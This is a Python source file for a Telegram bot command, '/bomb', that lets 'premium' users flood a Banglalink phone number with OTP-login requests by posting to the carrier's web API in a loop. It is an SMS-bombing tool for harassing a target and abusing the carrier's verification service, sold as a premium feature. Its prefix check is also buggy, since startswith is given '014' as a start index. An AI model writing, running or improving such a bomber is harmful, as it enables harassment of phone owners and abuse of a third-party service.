import requests
from pyrogram import Client, filters


def register(app):
    @app.on_message(filters.command("bomb"))
    async def bomb(client, message):
        with open(file="users/premium.txt", mode="r+", encoding='utf-8') as premium:
            premium_users = premium.readlines()
        if str(message.from_user.id) + '\n' in premium_users:
            try:
                _, number, amount = message.text.split()
                number = number.strip()
                amount = int(amount.strip())
            except ValueError:
                return await message.reply("<b>⎚ Use <code>/bomb </code>[number] [amount]</b>")
            except Exception as e:
                return await message.reply(f"<b>⎚ Error: {str(e)}</b>")

            if len(number) == 11 and number.startswith("019", "014"):
                status = await message.reply("<b>⎚ `Request Sending...`</b>")
                for _ in range(amount):
                    pera = {
                        "mobile": number
                    }
                    try:
                        req = requests.post(
                            url="https://web-api.banglalink.net/api/v1/user/otp-login/request", json=pera).json()
                    except Exception as e:
                        print(f"Error sending request: {str(e)}")
                await status.edit("<b>Finished</b>")
            else:
                await message.reply("<b>Please Use Banglalink Number Without +880</b>")

        else:
            return await message.reply(f'<b>Only For Premium Members</b>')
